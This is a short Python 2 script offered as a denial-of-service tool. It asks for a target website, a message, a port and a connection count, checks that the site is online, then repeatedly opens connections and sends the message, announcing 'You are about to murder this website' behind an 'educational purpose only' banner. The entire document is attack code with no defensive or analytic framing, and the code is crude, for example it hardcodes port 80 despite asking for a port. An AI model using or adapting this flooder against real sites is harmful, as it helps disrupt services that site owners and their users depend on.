import time, socket, os, sys, string ,httplib
 
print "\t################################################################"
print "\t#                                                              #"
print "\t#                                                              #"
print "\t#                    khanhnn@pythonvietnam.info                #"
print "\t#                                                              #"
print "\t#                                                              #"
print "\t################################################################"
 
 
print "You are about to murder this website ".center(40)
print "EDUCATIONAL PURPOSE ONLY "
 
 
 
 
 
host=raw_input( "Enter the website to DoS:" )
try :
        print ("\tChecking host" + host.center(10) + "..." )
        conn = httplib.HTTPConnection(host)
        conn.connect()
        print "\t... Server is Online."
except (httplib.HTTPResponse, socket.error) as Exit:
        raw_input("\t [!]... Server offline or invalid URL")
        exit()
 
 
 
print ("\t Done")
 
message=raw_input(str("Any message to send:" ))
port=input("Port you want to attack:" )
conn=input("How many connections you want to make:")
 
 
 
 
ip = socket.gethostbyname( host )
 
def dos_bomber():
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        dos.connect((host, 80))
        dos.send(message )
        dos.sendto(message, (ip, port) )
        dos.send(message );
    except socket.error, msg:
        print "|[Failed]...[!error] ...|".center(40)
    print  "[Attacking ]" + host.center(40)+ ip.center(40) 
    dos.close()
 
for i in xrange(conn):
    dos_bomber()